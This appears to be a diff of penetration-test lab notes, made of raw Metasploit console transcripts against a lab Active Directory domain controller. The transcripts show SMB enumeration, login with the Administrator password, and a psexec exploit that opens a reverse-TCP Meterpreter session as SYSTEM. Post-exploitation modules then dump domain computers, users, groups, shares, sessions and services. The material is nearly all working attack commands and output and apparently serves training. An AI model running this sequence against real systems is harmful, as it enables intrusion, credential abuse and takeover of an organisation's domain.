+192.168.250.254  bc:24:11:06:94:0c        Windows 2022                    server
+
+msf > services -R 192.168.250.250
+Services
+========
+
+host             port  proto  name           state  info
+----             ----  -----  ----           -----  ----
+192.168.250.250  53    tcp    domain         open   Simple DNS Plus
+192.168.250.250  88    tcp    kerberos-sec   open   Microsoft Windows Kerberos server time: 2026-01-30 09:46:10Z
+192.168.250.250  135   tcp    msrpc          open   Microsoft Windows RPC
+192.168.250.250  139   tcp    netbios-ssn    open   Microsoft Windows netbios-ssn
+192.168.250.250  389   tcp    ldap           open   Microsoft Windows Active Directory LDAP Domain: contoso.lab, Site: Default-First-Site-Name
+192.168.250.250  445   tcp    microsoft-ds   open
+192.168.250.250  464   tcp    kpasswd5       open
+192.168.250.250  593   tcp    ncacn_http     open   Microsoft Windows RPC over HTTP 1.0
+192.168.250.250  636   tcp    ssl/ldap       open   Microsoft Windows Active Directory LDAP Domain: contoso.lab, Site: Default-First-Site-Name
+192.168.250.250  3268  tcp    ldap           open   Microsoft Windows Active Directory LDAP Domain: contoso.lab, Site: Default-First-Site-Name
+192.168.250.250  3269  tcp    ssl/ldap       open   Microsoft Windows Active Directory LDAP Domain: contoso.lab, Site: Default-First-Site-Name
+192.168.250.250  3389  tcp    ms-wbt-server  open   Microsoft Terminal Services
+192.168.250.250  5357  tcp    http           open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
+192.168.250.250  5985  tcp    http           open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
+
+RHOSTS => 192.168.250.250
+
+
+---
+
+┌──(pt㉿cnt-pt-1)-[~]
+└─$ msfconsole -q                      
+msf > use auxiliary/scanner/smb/smb_version
+msf auxiliary(scanner/smb/smb_version) > show options
+
+Module options (auxiliary/scanner/smb/smb_version):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT                     no        The target port (TCP)
+   THREADS  1                yes       The number of concurrent threads (max one per host)
+
+
+View the full module info with the info, or info -d command.
+
+msf auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.250.250
+RHOSTS => 192.168.250.250
+msf auxiliary(scanner/smb/smb_version) > run
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.25/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
+[*] 192.168.250.250:445   - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:LZNT1, Pattern_V1) (encryption capabilities:AES-256-GCM) (signatures:required) (guid:{e40fccac-e3be-4f02-8122-f22f558ba483}) (authentication domain:CONTOSO)
+[+] 192.168.250.250:445   -   Host is running Version 10.0.20348 (likely Windows Server 2022)
+[*] 192.168.250.250       - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(scanner/smb/smb_version) > 
+
+
+---
+
+msf auxiliary(scanner/smb/smb_enumshares) > use auxiliary/scanner/smb/smb_enumshares
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+msf auxiliary(scanner/smb/smb_enumshares) > set RHOSTS 192.168.250.250
+RHOSTS => 192.168.250.250
+msf auxiliary(scanner/smb/smb_enumshares) > set SMBDomain contoso.lab
+SMBDomain => contoso.lab
+msf auxiliary(scanner/smb/smb_enumshares) > set SMBUser Administrator
+SMBUser => Administrator
+msf auxiliary(scanner/smb/smb_enumshares) > set SMBPass P@ssw0rd
+SMBPass => P@ssw0rd
+msf auxiliary(scanner/smb/smb_enumshares) > run
+[-] 192.168.250.250:139 - Login Failed: Unable to negotiate SMB1 with the remote host: Not a valid SMB packet
+[!] 192.168.250.250:139 - peer_native_os is only available with SMB1 (current version: SMB3)
+[!] 192.168.250.250:139 - peer_native_lm is only available with SMB1 (current version: SMB3)
+[+] 192.168.250.250:139 - ADMIN$ - (DISK|SPECIAL) Remote Admin
+[+] 192.168.250.250:139 - C$ - (DISK|SPECIAL) Default share
+[+] 192.168.250.250:139 - IPC$ - (IPC|SPECIAL) Remote IPC
+[+] 192.168.250.250:139 - NETLOGON - (DISK) Logon server share 
+[+] 192.168.250.250:139 - SYSVOL - (DISK) Logon server share 
+[*] 192.168.250.250: - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(scanner/smb/smb_enumshares) > 
+
+---
+
+msf auxiliary(scanner/smb/smb_login) > use auxiliary/scanner/smb/smb_login
+[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session
+msf auxiliary(scanner/smb/smb_login) > set RHOSTS 192.168.250.250
+RHOSTS => 192.168.250.250
+msf auxiliary(scanner/smb/smb_login) > set SMBDomain contoso.lab
+SMBDomain => contoso.lab
+msf auxiliary(scanner/smb/smb_login) > set SMBUser Administrator
+SMBUser => Administrator
+msf auxiliary(scanner/smb/smb_login) > set SMBPass P@ssw0rd
+SMBPass => P@ssw0rd
+msf auxiliary(scanner/smb/smb_login) > set CreateSession True
+CreateSession => true
+msf auxiliary(scanner/smb/smb_login) > run
+[*] 192.168.250.250:445   - 192.168.250.250:445   - Starting SMB login bruteforce
+[+] 192.168.250.250:445   - 192.168.250.250:445   - Success: 'contoso.lab\Administrator:P@ssw0rd' Administrator
+[*] SMB session 1 opened (192.168.250.100:34997 -> 192.168.250.250:445) at 2026-01-30 17:35:36 +0700
+[*] 192.168.250.250:445   - Scanned 1 of 1 hosts (100% complete)
+[*] 192.168.250.250:445   - Bruteforce completed, 1 credential was successful.
+[*] 192.168.250.250:445   - 1 SMB session was opened successfully.
+[*] Auxiliary module execution completed
+msf auxiliary(scanner/smb/smb_login) > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type  Information                              Connection
+  --  ----  ----  -----------                              ----------
+  1         smb   SMB Administrator @ 192.168.250.250:445  192.168.250.100:34997 -> 192.168.250.250:445 (192.168.250.250)
+
+msf auxiliary(scanner/smb/smb_login) > sessions -i 1
+[*] Starting interaction with 1...
+
+SMB (192.168.250.250) > 
+
+---
+
+
+msf auxiliary(scanner/smb/smb_login) > sessions -l # list all sessions
+
+Active sessions
+===============
+
+  Id  Name  Type  Information                              Connection
+  --  ----  ----  -----------                              ----------
+  1         smb   SMB Administrator @ 192.168.250.250:445  192.168.250.100:38443 -> 192.168.250.250:445 (192.168.250.250)
+
+msf auxiliary(scanner/smb/smb_login) > sessions -i 1 # enter to session 1
+[*] Starting interaction with 1...
+
+SMB (192.168.250.250) > background # exit from session
+[*] Backgrounding session 1...
+msf auxiliary(scanner/smb/smb_login) > sessions -i 1 # enter to session 1
+[*] Starting interaction with 1...
+
+SMB (192.168.250.250) > exit # exit from session and close
+[*] Shutting down session: 1
+
+[*] 192.168.250.250 - SMB session 1 closed.  Reason: User exit
+msf auxiliary(scanner/smb/smb_login) > sessions -l
+
+Active sessions
+===============
+
+No active sessions.
+
+msf auxiliary(scanner/smb/smb_login) > 
+
+---
+
+msf auxiliary(scanner/smb/smb_login) > sessions -i 1
+[*] Starting interaction with 1...
+
+SMB (192.168.250.250\C$) > shares
+Shares
+======
+
+    #  Name      Type          comment
+    -  ----      ----          -------
+    0  ADMIN$    DISK|SPECIAL  Remote Admin
+    1  C$        DISK|SPECIAL  Default share
+    2  IPC$      IPC|SPECIAL   Remote IPC
+    3  NETLOGON  DISK          Logon server share
+    4  SYSVOL    DISK          Logon server share
+
+SMB (192.168.250.250\C$) > shares -i 1
+[+] Successfully connected to C$
+SMB (192.168.250.250\C$) > ls
+ls 
+===
+
+    #   Type  Name                       Created                    Accessed                   Written                    Changed                    Size
+    -   ----  ----                       -------                    --------                   -------                    -------                    ----
+    0   DIR   $Recycle.Bin               2021-05-08T15:20:24+07:00  2025-01-18T18:57:32+07:00  2025-01-18T18:57:32+07:00  2025-01-18T18:57:32+07:00
+    1   DIR   $WinREAgent                2025-02-19T02:39:51+07:00  2025-02-19T02:39:51+07:00  2025-02-19T02:39:51+07:00  2025-02-19T02:39:51+07:00
+    2   DIR   -                          2025-01-24T15:36:17+07:00  2025-08-28T09:50:39+07:00  2025-08-28T09:50:39+07:00  2025-08-28T09:50:39+07:00
+    3   DIR   Documents and Settings     2025-01-18T08:56:39+07:00  2025-01-18T08:56:39+07:00  2025-01-18T08:56:39+07:00  2025-01-18T08:56:39+07:00
+    4   FILE  DumpStack.log.tmp          2025-01-18T08:52:19+07:00  2026-01-28T12:13:50+07:00  2026-01-28T12:13:50+07:00  2026-01-28T12:13:50+07:00  12288
+    5   FILE  hostname.txt               2026-01-31T19:45:29+07:00  2026-01-31T19:45:29+07:00  2026-01-31T19:45:29+07:00  2026-01-31T19:45:29+07:00  11
+    6   DIR   inetpub                    2025-08-16T01:09:28+07:00  2025-08-16T01:09:28+07:00  2025-08-16T01:09:28+07:00  2025-08-16T01:10:01+07:00
+    7   FILE  pagefile.sys               2025-01-18T08:52:18+07:00  2026-01-28T12:13:49+07:00  2026-01-28T12:13:49+07:00  2026-01-28T12:13:49+07:00  738197504
+    8   DIR   PerfLogs                   2021-05-08T15:20:24+07:00  2021-05-08T15:20:24+07:00  2021-05-08T15:20:24+07:00  2025-01-18T08:50:53+07:00
+    9   DIR   Program Files              2021-05-08T15:20:24+07:00  2025-02-14T13:10:12+07:00  2025-02-14T13:10:12+07:00  2025-02-14T13:10:12+07:00
+    10  DIR   Program Files (x86)        2021-05-08T15:20:24+07:00  2025-02-14T13:10:32+07:00  2025-02-14T13:10:32+07:00  2025-02-14T13:10:32+07:00
+    11  DIR   ProgramData                2021-05-08T15:20:24+07:00  2025-08-28T11:35:40+07:00  2025-08-28T11:35:40+07:00  2025-08-28T11:35:40+07:00
+    12  DIR   Recovery                   2025-01-18T08:56:46+07:00  2025-01-18T08:56:46+07:00  2025-01-18T08:56:46+07:00  2025-01-18T08:56:46+07:00
+    13  DIR   System Volume Information  2025-01-18T08:52:16+07:00  2025-01-24T18:37:40+07:00  2025-01-24T18:37:40+07:00  2025-01-24T18:37:40+07:00
+    14  DIR   Users                      2021-05-08T15:06:51+07:00  2025-01-24T16:00:22+07:00  2025-01-24T16:00:22+07:00  2025-01-24T16:00:22+07:00
+    15  DIR   Windows                    2021-05-08T15:06:51+07:00  2025-08-16T01:21:54+07:00  2025-08-16T01:21:54+07:00  2025-08-16T01:21:54+07:00
+
+SMB (192.168.250.250\C$) > cat hostname.txt
+cnt-adc-1
+
+SMB (192.168.250.250\C$) > download hostname.txt
+[*] Downloaded 11.00 B of 11.00 B (100.0%)
+[+] Downloaded hostname.txt to hostname.txt
+SMB (192.168.250.250\C$) > lcat hostname.txt
+cnt-adc-1
+SMB (192.168.250.250\C$) > 
+
+---
+
+┌──(pt㉿cnt-pt-1)-[~]
+└─$ msfconsole -q
+msf > use exploit/windows/smb/psexec
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+msf exploit(windows/smb/psexec) > set RHOST 192.168.250.250
+RHOST => 192.168.250.250
+msf exploit(windows/smb/psexec) > set SMBUser Administrator
+SMBUser => Administrator
+msf exploit(windows/smb/psexec) > set SMBPass P@ssw0rd
+SMBPass => P@ssw0rd
+msf exploit(windows/smb/psexec) > run
+[*] Started reverse TCP handler on 192.168.0.120:4444 
+[*] 192.168.250.250:445 - Connecting to the server...
+[*] 192.168.250.250:445 - Authenticating to 192.168.250.250:445 as user 'Administrator'...
+[*] 192.168.250.250:445 - Selecting PowerShell target
+[*] 192.168.250.250:445 - Executing the payload...
+[+] 192.168.250.250:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (190534 bytes) to 192.168.250.250
+[*] Meterpreter session 1 opened (192.168.0.120:4444 -> 192.168.250.250:61116) at 2026-01-31 20:11:13 +0700
+
+meterpreter > sysinfo
+Computer        : CNT-ADC-1
+OS              : Windows Server 2022 (10.0 Build 20348).
+Architecture    : x64
+System Language : ru_RU
+Domain          : CONTOSO
+Logged On Users : 8
+Meterpreter     : x86/windows
+meterpreter > bg
+[*] Backgrounding session 1...
+msf exploit(windows/smb/psexec) > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                      Connection
+  --  ----  ----                     -----------                      ----------
+  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ CNT-ADC-1  192.168.0.120:4444 -> 192.168.250.250:61116 (192.168.250.250)
+
+---
+
+
+[*] Backgrounding session 1...
+msf exploit(windows/smb/psexec) > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                      Connection
+  --  ----  ----                     -----------                      ----------
+  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ CNT-ADC-1  192.168.0.120:4444 -> 192.168.250.250:61116 (192.168.250.250)
+
+msf exploit(windows/smb/psexec) > 
+msf exploit(windows/smb/psexec) > use post/windows/gather/enum_ad_computers
+msf post(windows/gather/enum_ad_computers) > set filter objectCategory=computer
+filter => objectCategory=computer
+msf post(windows/gather/enum_ad_computers) > set session 1
+session => 1
+msf post(windows/gather/enum_ad_computers) > run
+Domain Computers
+================
+
+ dNSHostName               distinguishedName                                     description  operatingSystem                 operatingSystemServicePack
+ -----------               -----------------                                     -----------  ---------------                 --------------------------
+ cnt-adc-1.contoso.lab     CN=CNT-ADC-1,OU=Domain Controllers,DC=contoso,DC=lab               Windows Server 2022 Datacenter
+ cnt-srv-1.contoso.lab     CN=CNT-SRV-1,CN=Computers,DC=contoso,DC=lab                        Windows Server 2022 Datacenter
+ cnt-wks-1.contoso.lab     CN=CNT-WKS-1,CN=Computers,DC=contoso,DC=lab                        Windows 10 Enterprise
+ cnt-srv-ca-1.contoso.lab  CN=CNT-SRV-CA-1,CN=Computers,DC=contoso,DC=lab                     Windows Server 2022 Datacenter
+ cnt-pki-1.contoso.lab     CN=CNT-PKI-1,CN=Computers,DC=contoso,DC=lab                        Windows Server 2022 Datacenter
+
+[*] Post module execution completed
+msf post(windows/gather/enum_ad_computers) > 
+
+---
+
+
+msf post(windows/gather/enum_ad_computers) > use post/windows/gather/enum_ad_users
+msf post(windows/gather/enum_ad_users) > set session 1
+session => 1
+msf post(windows/gather/enum_ad_users) > run
+Domain Users
+============
+
+ sAMAccountName  name           userPrincipalName    userAccountControl  lockoutTime  mail  primarygroupid  description
+ --------------  ----           -----------------    ------------------  -----------  ----  --------------  -----------
+ Administrator   Administrator                       66048                                  513             Built-in account for administering the computer/domain
+ Guest           Guest                               66082                                  514             Built-in account for guest access to the computer/domain
+ krbtgt          krbtgt                              514                                    513             Key Distribution Center Service Account
+ user            user           user@contoso.lab     66048                                  513             Contoso Domain User
+ userSAN         userSAN        usersan@contoso.lab  66048                                  513             Contoso SAN Spoof Proxy User
+
+[*] Post module execution completed
+msf post(windows/gather/enum_ad_users) > use post/windows/gather/enum_ad_computers
+\msf post(windows/gather/enum_ad_computers) > set session 1
+session => 1
+msf post(windows/gather/enum_ad_computers) > run
+Domain Computers
+================
+
+ dNSHostName               distinguishedName                                     description  operatingSystem                 operatingSystemServicePack
+ -----------               -----------------                                     -----------  ---------------                 --------------------------
+ cnt-adc-1.contoso.lab     CN=CNT-ADC-1,OU=Domain Controllers,DC=contoso,DC=lab               Windows Server 2022 Datacenter
+ cnt-srv-1.contoso.lab     CN=CNT-SRV-1,CN=Computers,DC=contoso,DC=lab                        Windows Server 2022 Datacenter
+ cnt-wks-1.contoso.lab     CN=CNT-WKS-1,CN=Computers,DC=contoso,DC=lab                        Windows 10 Enterprise
+ cnt-srv-ca-1.contoso.lab  CN=CNT-SRV-CA-1,CN=Computers,DC=contoso,DC=lab                     Windows Server 2022 Datacenter
+ cnt-pki-1.contoso.lab     CN=CNT-PKI-1,CN=Computers,DC=contoso,DC=lab                        Windows Server 2022 Datacenter
+
+[*] Post module execution completed
+msf post(windows/gather/enum_ad_computers) > 
+
+---
+
+
+msf post(windows/gather/enum_ad_computers) > use post/windows/gather/enum_ad_groups
+msf post(windows/gather/enum_ad_groups) > set session 1
+session => 1
+msf post(windows/gather/enum_ad_groups) > run
+Domain Groups
+=============
+
+ name                                     distinguishedname                                                  description
+ ----                                     -----------------                                                  -----------
+ Administrators                           CN=Administrators,CN=Builtin,DC=contoso,DC=lab                     Administrators have complete and unrestricted access to the compu
+                                                                                                             ter/domain
+ Users                                    CN=Users,CN=Builtin,DC=contoso,DC=lab                              Users are prevented from making accidental or intentional system-
+                                                                                                             wide changes and can run most applications
+ Guests                                   CN=Guests,CN=Builtin,DC=contoso,DC=lab                             Guests have the same access as members of the Users group by defa
+                                                                                                             ult, except for the Guest account which is further restricted
+ Print Operators                          CN=Print Operators,CN=Builtin,DC=contoso,DC=lab                    Members can administer printers installed on domain controllers
+ Backup Operators                         CN=Backup Operators,CN=Builtin,DC=contoso,DC=lab                   Backup Operators can override security restrictions for the sole
+                                                                                                             purpose of backing up or restoring files
+ Replicator                               CN=Replicator,CN=Builtin,DC=contoso,DC=lab                         Supports file replication in a domain
+
+---
+
+msf exploit(windows/smb/psexec) > use post/windows/gather/enum_shares
+msf post(windows/gather/enum_shares) > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                      Connection
+  --  ----  ----                     -----------                      ----------
+  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ CNT-ADC-1  192.168.0.120:4444 -> 192.168.250.250:54784 (192.168.250.250)
+
+msf post(windows/gather/enum_shares) > use post/windows/gather/enum_shares
+msf post(windows/gather/enum_shares) > set session 1
+session => 1
+msf post(windows/gather/enum_shares) > run
+[*] Running module against CNT-ADC-1 (192.168.250.250)
+[*] The following shares were found:
+[*]     Name: SYSVOL
+[*]     Path: C:\Windows\SYSVOL\sysvol
+[*]     Remark: Logon server share 
+[*]     Type: DISK
+[*] 
+[*]     Name: NETLOGON
+[*]     Path: C:\Windows\SYSVOL\sysvol\contoso.lab\SCRIPTS
+[*]     Remark: Logon server share 
+[*]     Type: DISK
+[*] 
+[*] Post module execution completed
+msf post(windows/gather/enum_shares) > 
+
+---
+
+
+
+msf post(windows/gather/enum_shares) > use post/windows/gather/enum_logged_on_users
+msf post(windows/gather/enum_logged_on_users) > set session 1
+session => 1
+msf post(windows/gather/enum_logged_on_users) > run
+[*] Running module against CNT-ADC-1 (192.168.250.250)
+
+Current Logged Users
+====================
+
+ SID                                           User
+ ---                                           ----
+ S-1-5-21-4240677063-2458479951-783602691-500  CONTOSO\Administrator
+
+
+[+] Results saved in: /home/pt/.msf4/loot/20260131202732_default_192.168.250.250_host.users.activ_859418.txt
+
+Recently Logged Users
+=====================
+
+ SID                                           Profile Path
+ ---                                           ------------
+ S-1-5-18                                      C:\Windows\system32\config\systemprofile
+ S-1-5-19                                      C:\Windows\ServiceProfiles\LocalService
+ S-1-5-20                                      C:\Windows\ServiceProfiles\NetworkService
+ S-1-5-21-2495299273-1550643078-88650105-500   C:\Users\Administrator.CNT-ADC-1
+ S-1-5-21-4240677063-2458479951-783602691-500  C:\Users\Administrator
+
+
+[+] Results saved in: /home/pt/.msf4/loot/20260131202733_default_192.168.250.250_host.users.recen_196298.txt
+[*] Post module execution completed
+msf post(windows/gather/enum_logged_on_users) > 
+
+---
+
+msf post(multi/gather/dns_srv_lookup) > use post/windows/gather/enum_services
+msf post(windows/gather/enum_services) > set session 1
+session => 1
+msf post(windows/gather/enum_services) > run
+[*] Listing Service Info for matching services, please wait...
+[+] New service credential detected: ADWS is running as 'LocalSystem'
+[+] New service credential detected: AJRouter is running as 'NT AUTHORITY\LocalService'
+[+] New service credential detected: CryptSvc is running as 'NT Authority\NetworkService'
+[*] Found 222 Windows services matching filters
+
+Services
+========
+
+ Name                                       Credentials                  Command   Startup
+ ----                                       -----------                  -------   -------
+ ADWS                                       LocalSystem                  Auto      C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe
+ AJRouter                                   NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p
+ ALG                                        NT AUTHORITY\LocalService    Manual    C:\Windows\System32\alg.exe
+ AppIDSvc                                   NT Authority\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p
+ AppMgmt                                    LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k netsvcs -p
+ AppReadiness                               LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k AppReadiness -p
+ AppVClient                                 LocalSystem                  Disabled  C:\Windows\system32\AppVClient.exe
+ AppXSvc                                    LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k wsappx -p
+ Appinfo                                    LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k netsvcs -p
+ AudioEndpointBuilder                       LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
+ Audiosrv                                   NT AUTHORITY\LocalService    Manual    C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
+ AxInstSV                                   LocalSystem                  Disabled  C:\Windows\system32\svchost.exe -k AxInstSVGroup
+ BFE                                        NT AUTHORITY\LocalService    Auto      C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p
+ BITS                                       LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k netsvcs -p
+ BalloonService                             LocalSystem                  Auto      "C:\Program Files (x86)\SPICE Guest Tools\drivers\Balloon\2k16\amd64\blnsvr.exe"
+ BrokerInfrastructure                       LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k DcomLaunch -p
+ CDPSvc                                     NT AUTHORITY\LocalService    Auto      C:\Windows\system32\svchost.exe -k LocalService -p
+ CDPUserSvc_35153ef                                                      Auto      C:\Windows\system32\svchost.exe -k UnistackSvcGroup
+ COMSysApp                                  LocalSystem                  Manual    C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}
+ CaptureService_35153ef                                                  Manual    C:\Windows\system32\svchost.exe -k LocalService -p
+ CertPropSvc                                LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k netsvcs
+ ClipSVC                                    LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k wsappx -p
+ ConsentUxUserSvc_35153ef                                                Manual    C:\Windows\system32\svchost.exe -k DevicesFlow
+ CoreMessagingRegistrar                     NT AUTHORITY\LocalService    Auto      C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork -p
+ CredentialEnrollmentManagerUserSvc_35153e                               Manual    C:\Windows\system32\CredentialEnrollmentManager.exe
+ f
+ CryptSvc                                   NT Authority\NetworkService  Auto      C:\Windows\system32\svchost.exe -k NetworkService -p
+ CscService                                 LocalSystem                  Disabled  C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
+ DFSR                                       LocalSystem                  Auto      C:\Windows\system32\DFSRs.exe
+ DNS                                        LocalSystem                  Auto      C:\Windows\system32\dns.exe
+ DPS                                        NT AUTHORITY\LocalService    Auto      C:\Windows\System32\svchost.exe -k LocalServiceNoNetwork -p
+ DcomLaunch                                 LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k DcomLaunch -p
+ DevQueryBroker                             LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p
+ DeviceAssociationBrokerSvc_35153ef                                      Manual    C:\Windows\system32\svchost.exe -k DevicesFlow -p
+ DeviceAssociationService                   LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p
+ DeviceInstall                              LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k DcomLaunch -p
+ DevicePickerUserSvc_35153ef                                             Disabled  C:\Windows\system32\svchost.exe -k DevicesFlow
+ DevicesFlowUserSvc_35153ef                                              Manual    C:\Windows\system32\svchost.exe -k DevicesFlow
+ Dfs                                        LocalSystem                  Auto      C:\Windows\system32\dfssvc.exe
+ Dhcp                                       NT Authority\LocalService    Auto      C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p
+ DiagTrack                                  LocalSystem                  Auto      C:\Windows\System32\svchost.exe -k utcsvc -p
+ DispBrokerDesktopSvc                       NT AUTHORITY\LocalService    Auto      C:\Windows\system32\svchost.exe -k LocalService -p
+ DmEnrollmentSvc                            LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k netsvcs -p
+ Dnscache                                   NT AUTHORITY\NetworkService  Auto      C:\Windows\system32\svchost.exe -k NetworkService -p
+ DoSvc                                      NT Authority\NetworkService  Manual    C:\Windows\System32\svchost.exe -k NetworkService -p
+ DsRoleSvc                                  LocalSystem                  Manual    C:\Windows\System32\lsass.exe
+ DsSvc                                      LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
+ DsmSvc                                     LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k netsvcs -p
+ EFS                                        LocalSystem                  Manual    C:\Windows\System32\lsass.exe
+ EapHost                                    localSystem                  Manual    C:\Windows\System32\svchost.exe -k netsvcs -p
+ EntAppSvc                                  LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k appmodel -p
+ EventLog                                   NT AUTHORITY\LocalService    Auto      C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
+ EventSystem                                NT AUTHORITY\LocalService    Auto      C:\Windows\system32\svchost.exe -k LocalService -p
+ FDResPub                                   NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation -p
+ FontCache                                  NT AUTHORITY\LocalService    Auto      C:\Windows\system32\svchost.exe -k LocalService -p
+ FrameServer                                NT AUTHORITY\LocalService    Manual    C:\Windows\System32\svchost.exe -k Camera
+ FrameServerMonitor                         LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k CameraMonitor
+ GraphicsPerfSvc                            LocalSystem                  Disabled  C:\Windows\System32\svchost.exe -k GraphicsPerfSvcGroup
+ HvHost                                     LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p
+ IKEEXT                                     LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k netsvcs -p
+ InstallService                             LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k netsvcs -p
+ IsmServ                                    LocalSystem                  Auto      C:\Windows\System32\ismserv.exe
+ KPSSVC                                     NT AUTHORITY\NetworkService  Manual    C:\Windows\system32\svchost.exe -k KpsSvcGroup
+ Kdc                                        LocalSystem                  Auto      C:\Windows\System32\lsass.exe
+ KdsSvc                                     LocalSystem                  Manual    C:\Windows\system32\lsass.exe
+ KeyIso                                     LocalSystem                  Manual    C:\Windows\system32\lsass.exe
+ KtmRm                                      NT AUTHORITY\NetworkService  Manual    C:\Windows\System32\svchost.exe -k NetworkServiceAndNoImpersonation -p
+ LSM                                        LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k DcomLaunch -p
+ LanmanServer                               LocalSystem                  Auto      C:\Windows\System32\svchost.exe -k smbsvcs
+ LanmanWorkstation                          NT AUTHORITY\NetworkService  Auto      C:\Windows\System32\svchost.exe -k NetworkService -p
+ LicenseManager                             NT Authority\LocalService    Manual    C:\Windows\System32\svchost.exe -k LocalService -p
+ MDCoreSvc                                  LocalSystem                  Auto      "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25080.5-0\MpDefenderCoreService.ex
+                                                                                   e"
+ MSDTC                                      NT AUTHORITY\NetworkService  Auto      C:\Windows\System32\msdtc.exe
+ MSiSCSI                                    LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k netsvcs -p
+ MapsBroker                                 NT AUTHORITY\NetworkService  Disabled  C:\Windows\System32\svchost.exe -k NetworkService -p
+ McpManagementService                       LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k McpManagementServiceGroup
+ MicrosoftEdgeElevationService              LocalSystem                  Manual    "C:\Program Files (x86)\Microsoft\Edge\Application\143.0.3650.80\elevation_service.exe"
+ NTDS                                       LocalSystem                  Auto      C:\Windows\System32\lsass.exe
+ NcaSvc                                     LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k NetSvcs -p
+ NcbService                                 LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
+ NetSetupSvc                                LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k netsvcs -p
+ NetTcpPortSharing                          NT AUTHORITY\LocalService    Disabled  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe
+ Netlogon                                   LocalSystem                  Auto      C:\Windows\system32\lsass.exe
+ Netman                                     LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
+ NgcCtnrSvc                                 NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p
+ NgcSvc                                     LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p
+ NlaSvc                                     NT AUTHORITY\NetworkService  Auto      C:\Windows\System32\svchost.exe -k NetworkService -p
+ NtFrs                                      LocalSystem                  Disabled  C:\Windows\system32\ntfrs.exe
+ PcaSvc                                     LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p
+ PerfHost                                   NT AUTHORITY\LocalService    Manual    C:\Windows\SysWow64\perfhost.exe
+ PimIndexMaintenanceSvc_35153ef                                          Manual    C:\Windows\system32\svchost.exe -k UnistackSvcGroup
+ PlugPlay                                   LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k DcomLaunch -p
+ PolicyAgent                                NT Authority\NetworkService  Manual    C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted -p
+ Power                                      LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k DcomLaunch -p
+ PrintNotify                                LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k print
+ PrintWorkflowUserSvc_35153ef                                            Manual    C:\Windows\system32\svchost.exe -k PrintWorkflow
